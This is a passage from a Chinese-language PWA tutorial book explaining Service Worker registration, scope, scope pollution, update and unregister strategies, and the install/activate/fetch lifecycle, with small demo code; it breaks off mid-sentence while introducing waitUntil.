navigator.serviceWorker.register() 方法就能够注册一个 Service Worker，在当前的浏览器主线程的基础上新起一个 Service Worker 线程。 在示例项目的目录中还有一个 sw.js，有时候开发者会将这个 JavasScript 脚本文件称之为 Service Worker，这种说法不是很严谨，通常将可以被 navigator.serviceWorker.register() 方法注册的 JavaScript 文件称之为 Service Worker 文件，可以是任何命名，在这个示例中命名为 sw.js，其内容就是在 Service Worker 线程上下文中执行的内容（如果文件为空代表 worker 线程什么也不会做），由于 Service Worker 线程是独立于主线程的工作线程，所以在 sw.js 中的任何操作都不会影响到主线程。 接下来，我们来运行一下上面简易的示例，可以借助 local-web-server 工具在示例项目根目录下启动一个本地服务器，帮助我们查看一下 Service Worker 的具体运行状态，如下操作： $ npm install -g local-web-server $ ws 提示： 为了方便介绍，本章所有的 Demo 示例在提到 “运行” 的时候，都指的是在 Demo 项目的根目录通过 ws 命令启动 local-web-server，其默认 host 为 127.0.0.1，默认端口号为 8000。 使用 Chrome 浏览器访问示例站点 http://127.0.0.1:8000 的，可以在开发者模式的 Applications > Service Worker 面板中看到当前 Service Worker 线程的状态，在完成了 Service Worker 注册安装之后，结果如下图 4-1 所示： 当调节当前的网络状态为「离线」，依然可以看到 Service Worker 还是生效状态，通过这个例子可以发现，Service Worker 不仅是一个独立于主线程的的一个工作线程，并且还是一个可以在离线环境下运行的工作线程，这样就为 PWA 的离线与缓存功能提供了可行性基础。 为什么有 Service Worker 在了解了 Service Worker 是一个工作线程的本质之后，接下来继续了解一下为什么会有 Service Worker 这个技术出现呢？W3C（国际万维网联盟）早在 2014 年 5 月就提出了 Service Worker HTML5 API 草案，用来进行 Web 资源和请求的持久离线缓存。Service Worker 的来历可以从两个方面来介绍。 一方面，浏览器中的 JavaScript 都是运行在一个单一主线程上的，在同一时间内只能做一件事情。随着 Web 业务不断复杂，在 JavaScript 中的代码逻辑中往往会出现很多耗资源、耗时间的复杂运算过程。这些过程导致的性能问题在 Web App 日益增长的复杂化过程中更加凸显出来。所以 W3C 提出了 Web Worker API 来专门解放主线程，Web Worker 是脱离在主线程之外的工作线程，开发者可以将一些复杂的耗时的工作放在 Web Worker 中进行，工作完成后通过 postMessage 告诉主线程工作的结果，而主线程通过 onmessage 得到 Web Worker 的结果反馈，从而释放了主线程的性能压力。 代码执行性能问题好像是解决了，但 Web Worker 是临时存在的，每次做的事情的结果不能被持久存下来，如果下次访问 Web App 同样的复杂工作还是需要被 Web Worker 重新处理一遍，这同样是一件消耗资源的事情，只不过不是在主线程消耗罢了。那能不能有一个 Worker 线程是一直是可以持久存在的，并且随时准备接受主线程的命令呢？基于这样的需求 W3C 推出了最初版本的 Service Worker，Service Worker 在 Web Worker 的基础上加上了持久离线缓存能力，可以通过自身的生命周期特性保证复杂的工作只处理一次，并持久缓存处理结果，直到修改了 Service Worker 的内在的处理逻辑。 而另一方面，为了解决 Web 网络连接不稳定的问题，W3C 在很早的时候提出了 ApplicationCache 机制来解决离线缓存的问题，做法是在 HTML 页面中可以指定一个清单文件 manifest.appcache，清单中指定需要离线缓存的静态资源，ApplicationCache 能够解决离线可访问的问题。假设已经存在一个简单的项目 applicationCacheDemo，项目目录如下： . └── applicationCacheDemo/ ├── index.html └── manifest.appcache 下面是一个简单的 manifest.appcache 配置文件内容： CACHE MANIFEST # version xx.xx.xx CACHE: cached.png cached.js NETWORK: noCached.html noCached.css FALLBACK: / 404.html CACHE 字段配置了需要当前页面离线缓存的静态资源，NETWORK 字段配置了当前页面不需要离线缓存的静态资源，FALLBACK 字段指定了一个后备页面，当资源无法访问时，浏览器会使用该页面。该段落的每条记录都列出两个 URI，第一个表示资源，第二个表示后备页面。两个 URI 都必须使用相对路径并且与清单文件同源。可以使用通配符。有了 manifest.appcache 文件之后，可以在 index.html 的 HTML 文件中的 标签进行引入从而指定当前页面的静态资源离线缓存的情况，如下面代码所示： 虽然通过 ApplicationCache 机制能够解决 Web App 的离线缓存的问题，但是同时也带来了不小的问题： 在 manifest.appcache 文件中定义的资源全部被成功加载后，这些资源文件连同引用 manifest.appcahe 文件的 HTML 文档一并被移动到永久离线缓存中。所以如果想只缓存 JS、CSS、图片等文件，而不希望缓存 HTML 文档以保持获得最新内容的情况来说，是个非常大的问题。 根据 ApplicationCache 的加载机制，如果仅仅修改被缓存资源文件的内容（没有修改资源文件的路径或名称），浏览器将直接从本地离线缓存中获取资源文件。所以在每次修改资源文件的同时，需要修改 manifest.appcache 文件，以触发资源文件的重新加载和缓存，维护成本太高。 靠一个 manifest.appcache 配置文件来维护一个复杂的站点的缓存策略实在是一件非常艰难的工作，毕竟单纯靠配置是非常不灵活的。 对动态请求无法处理。 通过一段时间的实践后，W3C 决定废弃 ApplicationCache，虽然其仍然保留在 HTML 5.0 Recommendation 中，但会在 HTML 后续版本中移除。一些主流浏览器甚至已经将 ApplicationCache 标注为不推荐使用，并引导开发者使用 Service Worker。Service Worker 就很好的解决了 ApplicationCache 的痛点问题，它能够通过非常多的缓存策略来灵活的管理 Web App 的离线缓存，大大降低维护成本（我们会在后面章节详细的讲解这部分的内容）。 基于 Woker 工作线程的离线能力和离线缓存机制的双重迫切需求，通过不断的实践和发展，W3C 最终提出的 Service Worker API 可以以独立工作线程的方式运行，结合持久缓存调度策略，能够很好的解决离线缓存问题。并且可以以非侵入的方式与现存的 Web App 结合使用，从可以实现 PWA 渐进式的离线与缓存的效果。 Service Worker 的特点 Service Worker 功能虽然强大，但是使用 Service Worker 还是有一定的条件以及一些专有的特点的。 出于安全的考虑 Service Worker 必须运行在 HTTPS 协议下，Github 提供的 git page是个用来测试 Service Worker 的好地方，因为它就直接就支持 HTTPS，直接就可以测试静态页面和静态资源，为了便于本地开发，localhost、127.0.0.1 这种非 HTTPS 协议也被浏览器认为是安全源。 Service Worker 线程有自己完全独立的执行上下文。一旦被安装成功就永远存在，除非线程被程序主动解除，而且 Service Worker 在访问页面的时候可以直接被激活，如果关闭浏览器或者浏览器标签的时候会自动睡眠，以减少资源损耗。 Service Worker 是完全异步实现的，内部的接口的异步化都是通过 Promise 实现，并且在 Service Worker 中不能直接操作 DOM，出于安全和体验的考虑，UI 的渲染工作必须只能在主线程完成。 Service Worker 可以拦截并代理请求，可以处理请求的返回内容，可以持久化缓存静态资源达到离线访问的效果，和 ApplicationCache 不同，Service Worker 的所有的离线内容开发者完全可控，甚至是可以控制动态请求，第三方静态资源等。 由于 Service Worker 可以离线并且在后台工作，所以可以进行 推送消息（第六章会详细说明）、后台同步资源等功能，在不久的将来，利用 Service Worker 的这一特性，甚至可以衍生出更多的 Web App 原生化的功能。 浏览器支持程度 由于 W3C 标准或草案的提出之后各大浏览器的实现步伐是不一样的，参考 Can I Use 截止 2019-04-02 的数据，如下图 4-2 所示当前各大浏览器对 Service Worker 的支持情况如下。 从上图 4-2 可以看出，Service Worker 的支持程度已经达到 89.84%。其中 Chrome 作为开路先锋早早的在 V40 版本就已经支持 Service Worker，并在 Devtools 中还提供了完善的 Debug 方案，Apple 方面从 MacOS Safari 11.1 和 iOS Safari 11.3 开始全面支持，IE Edge 从 17 版本开始也全面支持。 目前 Apple 和微软都已经支持了 Service Worker，所以对于 “离线可访问” 这样的 PWA 特性来讲，几乎可以在任何的现代浏览器中被实现。 更详细的 Service Worker 浏览器支持信息，可以在 Jake Archibald 的 Is ServiceWorker Ready 网站上查看所有浏览器的支持情况。 由于 Service Worker 的功能是渐进式的，如果浏览器不支持 Service Worker，在架构设计上 Web App 也应该能够正常运行，为了防止 JavaScript 报错，所以通常在注册之前需要进行嗅探处理。修改 serviceWorkerDemo 的 index.html 代码如下所示： Service Worker Demo if ('serviceWorker' in navigator) { navigator.serviceWorker.register('./sw.js') } 小结 本节介绍了 Service Worker 的一些基本概念和 Service Worker 的一些背景和功能，但是对注册的细节，Service Worker 生命周期等细节没有做深入介绍，这些内容对于使用 Service Worker 对 Web App 进行离线缓存处理有重要作用。接下来的章节将会对 Service Worker 的这些细节做更加详细的介绍。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter04/2-service-worker-register.html":{"url":"chapter04/2-service-worker-register.html","title":"4.2 Service Worker 注册","keywords":"","body":"Service Worker 注册 通过前面对 Service Worker 概念的介绍，我们对 Service Worker 的一些概念和原理有了一定的了解，在本节将会重点介绍 Service Worker 注册的相关内容。主要会介绍如何为 Web App 注册一个 Service Worker、在不同的项目架构下注册 Service Worker 的方法、Service Worker 注册的一些细节和注意点等。 作用域 Service Worker 是有自己的作用域的，Service Worker 作用域是一个 URL path 地址，指的是 Servcie Worker 能够控制的页面的范围，例如：某个 Service Worker 的作用域为 https://somehost/a/b/，那这个 Service Worker 能控制 https://somehost/a/b/ 目录下的所有页面，可以包含下面列出的页面： https://somehost/a/b/index.html https://somehost/a/b/c/index.html https://somehost/a/b/anothor.html ... 所谓的 “控制页面” 指的是 Service Worker 可以处理这些页面里面的资源请求和网络请求，然后通过 Service Worker 自身的调度机制构建离线缓存策略。如果页面不在 Service Worker 的作用域范围内，Service Worker 就无法处理页面的任何资源或请求。 为了加深对 Service Worker 作用域的理解，接下来还是来看下 serviceWorkerDemo 这个示例，在 index.html 中修改一下代码如下所示： Service Worker Demo if ('serviceWorker' in navigator) { navigator.serviceWorker.register('./sw.js') .then(reg => { console.log(reg) }) } 首先从上面代码可以看出 navigator.serviceWorker.register() 方法返回的是一个 Promise，这个 Promise 中 resolve 返回的是 Service Worker 注册成功后返回的 ServiceWorkerRegistration 对象。运行之后将这个对象打印出来的结果如下图 4-4 所示。 ServiceWorkerRegistration 对象中的 scope 的值就是当前的 Service Worker 的作用域，在这个示例中为 http://127.0.0.1:8000/。 为了更直观的看到 Service Worker 作用域的工作原理，接下来新建一个 serviceWorkerScopeDemo 项目，项目目录结构如下： . └── serviceWorkerScopeDemo ├── a │ └── b │ └── sw.js └── index.html 将 sw.js 放入 /a/b/ 目录下，将 index.html 中的注册 Service Worker 逻辑修改一下，代码如下所示： Service Worker Scope Demo if ('serviceWorker' in navigator) { navigator.serviceWorker.register('./a/b/sw.js') .then(reg => { console.log(reg.scope) // http://127.0.0.1:8000/a/b/ }) } 将 navigator.serviceWorker.register() 方法的 Service Worker 文件 URL 改成 ./a/b/sw.js，运行结果打印出来的 scope 结果为 http://127.0.0.1:8000/a/b/。通常情况下在注册 sw.js 的时候会忽略 Service Worker 作用域的问题，Service Worker 默认的作用域就是注册时候的 path, 例如：Service Worker 注册的 path 为 /a/b/sw.js，则 scope 默认为 /a/b/。 也可以通过在注册时候在 navigator.serviceWorker.register() 方法中传入 {scope: '/some/scope/'} 参数的方式自己指定作用域，如下代码所示： Service Worker Scope Demo if ('serviceWorker' in navigator) { navigator.serviceWorker.register('./a/b/sw.js', { // 手动指定一个作用域 scope: '/a/b/c/' }).then(reg => { console.log(reg.scope) // http://127.0.0.1:8000/a/b/c/ }) } 将 scope 配置 {scope: '/a/b/c/'} 传入 navigator.serviceWorker.register() 方法，运行后打印出来的内容为 http://127.0.0.1:8000/a/b/c/。也就是说可以通过参数为 Service Worker 指定一个作用域。当然，这个自定义作用域是不可以随意指定的，可以通过如下代码修改 index.html： Service Worker Scope Demo if ('serviceWorker' in navigator) { navigator.serviceWorker.register('./a/b/sw.js', { scope: '/a/' }).then(reg => { console.log(reg.scope) }) } 上面代码将作用域指定为 /a/，运行后浏览器会报错，报错的内容如下图 4-5 所示。 通过报错信息知道 sw.js 文件所在的 URL 的 path 是 /a/b/，则默认的作用域和最大的作用域都是 /a/b/，不允许指定超过最大作用域范围的 /a/ 为作用域。 通俗的讲，Service Worker 最多只能在 Service Worker 文件 URL path 范围内发挥作用，以上面代码为例，/a/b/，/a/b/c/，/a/b/c/d/ 下的页面都可以被注册的 Service Worker 控制。但是 /a/、/e/f/ 目录下面的页面是不受注册的 Service Worker 的控制的（当然浏览器也会抛出错误告知开发者）。也就是说，在最大作用域的基础上才能通过 scope 配置在注册 Service Worker 的时候指定自定义的作用域。 注意： 类似于 Ajax 的跨域请求可以通过对请求的 Access-Control-Allow-Origin 设置，我们也可以通过服务器对 sw.js 这个文件的请求头进行设置，就能够突破作用域的限制，只需要在服务端对 sw.js 请求设置 Service-Worker-Allowed 请求头为更大控制范围或者其他控制范围的 scope 即可。如：Service-Worker-Allowed: /a/。 Service Worker 作用域污染 通过对 Service Woker 作用域的了解会发现一个问题：会不会存在多个 Service Worker 控制一个页面的情况呢？ 接下来再新建 serviceWorkerScopeDemo1 项目来了解注册多个 Service Worker 的情况下会有些什么神奇的情况发生。项目目录如下所示： . └── serviceWorkerScopeDemo1 ├── a/ │ ├── a-sw.js │ └── index.html ├── b/ │ └── index.html └── root-sw.js 如果 /a/index.html 页面是如下方式注册 Service Worker： Service Worker Scope DEMO1 PageA if ('serviceWorker' in navigator) { navigator.serviceWorker.register('./a-sw.js') } 而 /b/index.html 页面是如下方式注册 Service Worker： Service Worker Scope DEMO1 PageB if ('serviceWorker' in navigator) { navigator.serviceWorker.register('../root-sw.js') } http://127.0.0.1:8000/a/index.html 页面（称为 A 页面）在 /a/ 作用域下注册了一个 Service Worker，而 http://127.0.0.1:8000/b/index.html 页面（称为 B 页面）在 / 作用域下注册了一个 Service Worker，这种情况下 B 页面的 Service Worker 就可以控制 A 页面，因为 B 页面的作用域是包含 A 页面的最大作用域的，这个时候这种情况就称之为作用域污染，这时候就会出现如下图 4-6 所示的情况，A 页面被两个 Service Worker 所控制。 在开发环境开发者在 Chrome 浏览器还可以通过 Devtools 进行手动 “unregister” 来清除掉污染的 Service Worker，但是如果在线上环境被安装了 Service Worker 之后这就是个持久的过程。除非用户手动清除存储的缓存（这个也是不可能的），否则就会出现 Service Worker 交叉控制页面的问题。 当然，线上出现作用域污染的情况也是有办法解决的，比较合理的一种做法是在 A 页面新上线的 /a/index.html 版本中注册 Service Worker 之前借助 navigator.serviceWorker.getRegistrations() 方法将污染的 Service Worker 先注销掉，然后在注册自己的所在作用域的 Service Worker。具体做法还是看下示例，将 serviceWorkerScopeDemo1 项目的 /a/index.html 文件修改后代码如下所示： Service Worker Scope Demo1 PageA if ('serviceWorker' in navigator) { navigator.serviceWorker.getRegistrations() .then(regs => { for (let reg of regs) { // 注销掉不是当前作用域的所有的 Service Worker if (reg.scope !== 'https://127.0.0.1:8000/a/') { reg.unregister() } } // 注销掉污染 Service Worker 之后再重新注册自己作用域的 Service Worker navigator.serviceWorker.register('./a-sw.js') }) } 通过这样的方式，运行 serviceWorkerDemo 项目会发现，A 页面只会有一个被自己注册的 Service Worker 生效，在复杂的项目架构中，Service Worker 的作用域污染问题会经常发生，在设计 Service Worker 注册逻辑的时候，尤其是大型的 Web App 项目的时候需要考虑到这点。 Service Worker 注册设计 由于 Service Worker 注册会有意想不到的作用域污染问题，而 Web App 项目又有多种形式存在，有 SPA（单页面应用），MPA（多页面应用）等架构方式，那到底怎么进行 Service Worker 注册才合适呢？ SPA 注册 Service Worker SPA 在工程架构上只有一个 index.html 的入口，站点的内容都是异步请求数据之后在前端渲染的，应用中的页面切换都是在前端路由控制的。 通常会将这个 index.html 部署到 https://somehost，SPA 的 Service Worker 只需要在 index.html 中注册一次。所以一般会将 sw.js 直接放在站点的根目录保证可访问，也就是说 Service Worker 的作用域通常就是 /，这样 Service Worker 能够控制 index.html，从而控制整个 SPA 的缓存。 SPA 每次路由的切换都是前端渲染的，这个过程本质上还是在 index.html 上的前端交互。通常 Service Worker 会预先缓存 SPA 中的 AppShell 所需的静态资源以及 index.html。当然有一种情况比较特殊，当用户从 https://somehost/a 页面切换到 https://somehost/b 页面的时候，这时候刷新页面首先渲染的还是 index.html，在执行 SPA 的路由逻辑之后，通过 SPA 前端路由的处理，继续在前端渲染相应的路由对应的渲染逻辑，这部分的逻辑都是在已经缓存的 JavaScript 中完成了。 MPA 注册 Service Worker MPA 这种架构的模式在现如今的大型 Web App 非常常见，这种 Web App 相比较于 SPA 能够承受更重的业务体量，并且利于大型 Web App 的后期维护和扩展。MPA 可以理解为是有多个 HTML 文件对应着多个不同的服务端路由，也就是说 https://somehost/a 映射到 a.html，https://somehost/b 映射到 b.html。 那么 MPA 架构下怎么去注册 Service Worker 呢？是不同的页面注册不同的 Service Worker，还是所有的页面都注册同一个 Service Worker？结论是：需要根据实际情况来定。 MPA 注册单个 Service Worker 在每个页面之间的业务相似度较高，或者每个页面之间的公共静态资源或异步请求较多，这种 MPA 是非常适合在所有的页面只注册一个 Service Worker。 例如 https://somehost/a 和 htps://somehost/b 之间的公共内容较多，则通常情况下在 / 作用域下注册一个 Service Worker。这样这个 Service Worker 能够控制 https://somehost 域下的所有页面。 MPA 维护单个 Service Worker 有如下特点： 可以统一管理整个站点的缓存。 不会造成页面之间的作用域污染。 后期维护成本相对较低。 MPA 注册多个 Service Worker MPA 注册多个 Service Worker 适用于主站非常庞大的 Web App，并且是以 path 分隔的形式铺展垂类子站的大型 Web App，这种情况下就不适合只在 / 作用域下只注册一个 Service Worker 了。 例如：https://somehost/a 和 https://somehost/b 几乎是两个站点，其中公共使用的静态资源或异步请求非常少，则比较适合每个子站注册维护自己的 Service Worker，https://somehost/a 注册 Servcie Worker 的作用域为 /a/，最好是存在 /a/sw.js 对应的 Service Worker 文件 URL 可访问，尽量不要使用某一个公用的 /sw.js 并使用 scope 参数来自定义作用域，这样会增加后期的维护成本以及增加出现 bug 的风险。 子站在实现上还要考虑一点是，防止其他页面的 Service Worker 对自身页面造成污染，需要在注册子站 Service Worker 之前将不是子站 path 作用域的 Service Worker 先注销掉。 注册多个 Service Worker 有如下特点： 需要严格要求每个子站管理好自己的 sw.js 及作用域。 防止对其他子站的 Service Worker 造成影响。 相比较整个站点只注册一个 Service Worker，这种维护多个 Service Worker 的方式更加灵活。 随着子站的增多，风险相对会更加大，也更加难以维护。 Service Worker 更新 当在页面中通过 sw.js 注册了一个 Service Worker 之后，如果 sw.js 内容发生了变更，Service Worker 该如何更新呢？ 拿 SPA 为例，作为 AppShell 的载体 index.html 是会被缓存起来的，AppShell 的静态资源也都会被缓存起来的，由于 Service Worker 的注册入口必须是在主线程完成，所以 Service Worker 的注册必然是需要在 index.html 的 标签或者被缓存住的 JavaScript 文件中来实现的。 如果 Web App 功能发生了升级更新，我们预期的结果是当用户刷新页面的时候希望浏览器立即更新当前页面的缓存，并且立即加载最新的内容和资源，呈现最新的效果给用户看到。可是用户在刷新页面的时候看到的还是之前缓存的老的内容，这时候该如何处理呢？ 通常在每次进行 Web App 升级的时候，都必须伴随着 Service Worker 文件 sw.js 的升级，当浏览器检测到 sw.js 的升级之后，就会重新触发注册、安装、激活、控制页面的流程，并在这个过程中就会更新当前 Web App 的离线缓存为最新的上线内容。 在执行 navigator.serviceWorker.register() 方法注册 Service Worker 的时候，浏览器通过自身 diff 算法能够检测 sw.js 的更新包含两种方式： Service Worker 文件 URL 的更新 Service Worker 文件内容的更新 在实际项目中，在 Web App 新上线的时候，通常是在注册 Service Worker 的时候，通过修改 Service Worker 文件的 URL 来进行 Service Worker 的更新，一般采用以下代码所示的方式处理： if ('serviceWorker' in navigator) { navigator.serviceWorker.register('./sw.js?v=20190401235959') } 每次 Web App 上线构建的时候，维护一个最新的唯一构建版本号，将构建版本号写入 Service Worker 文件 URL 的版本号参数中，这样的话，就能够保证每次 Web App 有最新上线功能的时候，都能够有最新的 Service Worker 文件 diff 让浏览器能够检测到。当然，除了改变 Service Worker 文件 URL，还可以改变 Service Worker 文件的内容，如下代码所示： // sw.js self.version = '20190401235959' 注意： 在 sw.js 中，self 为 Service Worker 线程的全局命名空间，类似于主线程的 window，在 sw.js 中是访问不到 window 命名空间的。 在 Web App 每次上线新的功能，项目进行构建的时候，可以将最新的唯一构建版本号写在 sw.js 文件内，这样也能保证每次 Web App 都能够有最新的 Service Worker 文件 diff 被浏览器检测到。 Service Worker 容错 由于 Service Worker 一旦上线就会永久生效，如果发现线上 Service Worker 有 bug 该怎么办呢？有一种亡羊补牢的方法是重新上一次线，注销掉有 bug 的 Service Worker，假如现在有一个现存的项目 serviceWorkerUnregisterDemo，项目目录如下： . └── serviceWorkerUnregisterDemo/ ├── index.html └── sw.js 如果需要紧急下线该项目的 Service Worker，则 index.html 代码如下所示： Service Worker Unregister Demo if ('serviceWorker' in navigator) { navigator.serviceWorker.getRegistrations() .then(regs => { for (let reg of regs) { // 注销掉所有的 Service Worker reg.unregister() } }) } 这种方法是在发现 Service Worker 出现问题之后，必须重新上线 Web App 来解决问题，这样的成本比较高。一般大型 Web App 上线的过程也非常复杂，上线周期长，所以这种止损效果较差，不是很可取。还有一种方法可以避免重新上线 Web App，只需要在 Service Worker 注册的时候通过一个 “开关请求” 做一个容错降级的处理，这个开关请求需要满足几个条件： 能够快速上线，和 Web App 的上线解耦 不能被缓存（无论是 HTTP 缓存还是 Service Worker 缓存） 在实际项目中，通常开关请求会维护成一个 JavaScript 文件（当然也可以是任何一种请求类型，只不过 JavaScript 文件通常比较好维护，而且无需考虑请求跨域的问题），放在某一个可以快速上线的静态资源服务器。那么现在可以修改 serviceWorkerUnregisterDemo 项目的 index.html 代码来看看具体如何解决问题的，代码如下面所示： Service Worker Unregister Demo if ('serviceWorker' in navigator) { // 正常进行注册 Service Worker navigator.serviceWorker.register('./sw.js?v=20190401235959') let script = document.createElement('script') // 假设这个 JS 中存在 Service Worker 开关全局变量 script.src = 'https://some-static-cdn-host/sw-on-off.js' script.async = true script.onload = () => { // Service Worker 开关全局变量的名称 if (window.SW_TURN_OFF) { navigator.serviceWorker.getRegistrations() .then(regs => { for (let reg of regs) { // 注销掉所有的 Service Worker reg.unregister() } }) } } document.body.appendChild(script) } 假如在 https://some-static-cdn-host/sw-on-off.js 静态资源服务器维护了一个开关 JavaScript 文件，那这个文件正常情况下的代码内容如下所示： /** * @file https://some-static-cdn-host/sw-on-off.js */ // 当 Web App 线上出现紧急问题的时候将值设为 true 并上线 window.SW_TURN_OFF = false 小结 本节从注册 Service Worker 的角度出发，详细的介绍了在注册 Service Worker 的过程中需要考虑哪些问题，在不同的项目架构或者不同的情况下，注册 Service Worker 的考量点都是不一样的，接来下将会详细介绍 Service Worker 的技术细节，了解 Service Worker 到底是如何进行 PWA 的离线缓存的。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter04/3-service-worker-dive.html":{"url":"chapter04/3-service-worker-dive.html","title":"4.3 Service Worker 工作原理","keywords":"","body":"Service Worker 工作原理 前面已经介绍了 Service Worker 是一个工作线程的本质，也了解了 Service Worker 可以离线工作，还介绍了 Service Worker 在主线程中是如何被注册的。但是到现在为止还是不知道 Service Worker 具体怎么在实际项目中应用。也不知道如何去开发和维护一个 Service Worker 文件。我们已经知道了 Service Worker 是可以对 Web App 的资源和请求进行离线缓存，那它到底是如何进行离线缓存控制的呢？ 在本节，我们会深入的介绍一下 Service Worker 的工作原理，Service Worker 的工作原理主要体现在它的生命周期上，一个 Service Worker 从被注册开始，就会经历自身的一些生命周期的节点，而在这些节点都可以去做一些特定的事情，比如一些复杂的计算、缓存的写入、缓存的读取等操作。通过这些生命周期节点的联合调度，Service Worker 才能完成复杂的资源离线缓存的工作。而开发者只有了解了 Service Worker 的生命周期，才能通过设计相关逻辑，并开发 Service Worker 文件 sw.js ，让 Service Worker 去完成 PWA 离线缓存策略。 生命周期 先来了解下什么是 Service Worker 的生命周期，每个 Service Worker 都有一个独立于 Web 页面的生命周期，其示意图如下图 4-7 所示。 在主线程成功注册 Service Worker 之后，开始下载并解析执行 Service Worker 文件，执行过程中开始安装 Service Worker，在此过程中会触发 worker 线程的 install 事件。 如果 install 事件回调成功执行（在 install 回调中通常会做一些缓存读写的工作，可能会存在失败的情况），则开始激活 Service Worker，在此过程中会触发 worker 线程的 activate 事件，如果 install 事件回调执行失败，则生命周期进入 Error 终结状态，终止生命周期。 完成激活之后，Service Worker 就能够控制作用域下的页面的资源请求，可以监听 fetch 事件。 如果在激活后 Service Worker 被 unregister 或者有新的 Service Worker 版本更新，则当前 Service Worker 生命周期完结，进入 Terminated 终结状态。 Service Worker 生命周期是一个比较复杂的知识点，其中有较多的细节需要深入理解，为了更清楚的进行介绍，接下来新建一个项目 serviceWorkerLifecycleDemo，项目目录结构如下： . └── serviceWorkerLifecycleDemo/ ├── imgs/ │ └── dog.jpg ├── index.html └── sw.js 首先，需要有一个 Service Worker 的注册入口，所以 index.html 的代码内容如下所示： Service Worker Lifecycle Demo if ('serviceWorker' in navigator) { // 由于 127.0.0.1:8000 是所有测试 Demo 的 host // 为了防止作用域污染，将安装前注销所有已生效的 Service Worker navigator.serviceWorker.getRegistrations() .then(regs => { for (let reg of regs) { reg.unregister() } navigator.serviceWorker.register('./sw.js') }) } 注意： 由于 Service Worker 一旦注册后就会永久生效，而生效的控制范围是根据作用域来控制的，我们所有的测试 host 都为 127.0.0.1:8000，这样会导致新的项目还没注册 Service Worker 却已经被之前注册的 Service Worker 所控制，所以通常在注册新的 Service Worker 的时候，为了彻底防止作用域污染的做法就是在注册前将所有现存控制当前页面的 Service Worker 全部注销掉，或者在 Chrome Devtools 中每次都将老的 Service Worker 手动 unregister 掉。 这次在 serviceWorkerLifecycleDemo 项目的 HTML 文件中加入一个 标签来加载一张图片，主要是用来理解 Service Worker 如何在生命周期中进行离线与缓存处理的。 虽然空的 Service Worker 文件也是可以通过注册来新开一个 Service Worker 线程，但是通常 Service Worker 文件中需要编写一些 JavaScript 代码逻辑来完成 Web App 的离线与缓存的策略设计。接下来我们会一步步的详细讲解这些代码该如何编写，首先先给 sw.js 写入以下代码，用来理解 Service Worker 的生命周期： // sw.js console.log('service worker 注册成功') self.addEventListener('install', () => { // 安装回调的逻辑处理 console.log('service worker 安装成功') }) self.addEventListener('activate', () => { // 激活回调的逻辑处理 console.log('service worker 激活成功') }) self.addEventListener('fetch', event => { console.log('service worker 抓取请求成功: ' + event.request.url) }) 这段代码一开始是直接通过 console.log() 打印输出一段内容，然后绑定了三个事件，分别是 install、activate、fetch 事件，用来响应 Service Worker 生命周期的事件触发。 接下来用 Chrome 浏览器来测试一下 serviceWorkerLifecycleDemo 这个例子，为了更好的理解测试结果，在打开测试页面 http://127.0.0.1:8000 之前需要将所有的浏览器标签关闭（后面会详细解释为什么需要如此操作）。不出意外的话，第一次访问 http://127.0.0.1:8000 页面的时候 Chrome Devtools Console 控制台的打印结果如下： service worker 注册成功 service worker 安装成功 service worker 激活成功 当我们第二次刷新页面的时候，这时候控制台的打印结果如下： service worker 抓取请求成功：http://127.0.0.1:8000/imgs/dog.jpg 从这个执行结果来看，初步能够说明以下几点： Service Worker 文件只在首次注册的时候执行了一次。 安装、激活流程也只是在首次执行 Service Worker 文件的时候进行了一次。 首次注册成功的 Service Worker 没能拦截当前页面的请求。 非首次注册的 Service Worker 可以控制当前的页面并能拦截请求。 Service Worker 在内部都有一系列的工作流程，这些工作流程决定了开发者可以在 Service Worker 文件中如何进行开发。下图 4-8 展示的是 Service Worker 工作流程图。 实际上 Service Worker 首次注册或者有新版本触发更新的时候，才会重新创建一个 worker 工作线程并解析执行 Service Worker 文件，在这之后并进入 Service Worker 的安装和激活生命周期。 而在首次注册、安装、激活之后，Service Worker 已经拿到了当前页面的控制权了，但为什么首次刷新却没有拦截到网络请求呢？主要是因为在 Service Worker 的注册是一个异步的过程，在激活完成后当前页面的请求都已经发送完成，因为时机太晚，此时是拦截不到任何请求的，只能等待下次访问再进行。 而第二次刷新页面，由于当前站点的 Service Worker 是处于激活状态，所以不会再次新建 worker 工作线程并执行 Service Worker。也就是说激活状态的 Service Worker 在一个站点只会存在一个 worker 工作线程，除非 Service Worker 文件发生了变化（手动 unregister Service Worker 也会注销掉 worker 工作线程），触发了浏览器更新，才会重新开启生命周期。而由于 Service Worker 工作线程的离线特性，只要处于激活状态，在后续的任何访问中，都会通过 fetch 事件监听器拦截当前页面的网络请求，并执行 fetch 事件回调。 waitUntil 机制 如果 Service Worker 安装失败会导致 Service Worker 生命周期终止。由于 Service Worker install 回调是在用户首次访问注册的时候才会触发，所以在项目设计的时候，会将 Web App 一些只有上线才会改变的静态资源会在 install 阶段进行缓存，让用户更快的体验到缓存加速的好处。如果缓存成功了才算是 Service Worker 安装完成，如果这些静态资源缓存失败了，那 Service Worker 安装就会失败，生命周期终止。 什么情况下才算是 Service Worker 安装失败呢？如果在 Service Worker 文件中的 install 回调中写一段错误逻辑会不会导致安装失败呢？接下来修改一下 serviceWorkerLifecycleDemo 的 sw.js，代码如下： // sw.js console.log('service worker 注册成功') self.addEventListener('install', () => { // 一段一定会报错的代码 console.log(a.undefined) console.log('service worker 安装成功') }) self.addEventListener('activate', () => { // 激活回调的逻辑处理 console.log('service worker 激活成功') }) self.addEventListener('fetch', event => { console.log('service worker 抓取请求成功: ' + event.request.url) }) 在 install 事件回调中，插入了一段一定会报错的代码，看看是不是会导致 Service Worker 的安装失败呢？ 注意： 前面介绍过，由于修改了 sw.js，所以会触发 Service Worker 更新机制，而这次测试是纯粹介绍首次安装失败的情况，为保证实验的纯粹性，需要在 Chrome DevTools 中将存在的 Service Worker 手动 unregister 掉，在后面介绍 Service Worker 更新机制的时候会详细解释其原理。 示例运行结果如下图 4-9 所示： 从运行结果看，当 install 回调中的逻辑报错了，并不会影响 Service Worker 的生命周期继续向后推进，因为运行结果还是有 激活成功，甚至第二次刷新发现还能正常拦截请求。 所以说并不是 intall 回调中出错了就会导致生命周期中断。由于 Service Worker 生命周期异步触发的特性，并不是像同步执行模式，如果报错就会中断执行。Service Worker 事件回调的参数是一个 ExtendableEvent 对象，在 Service Worker 中需要使用 ExtendableEvent.waitUntil() 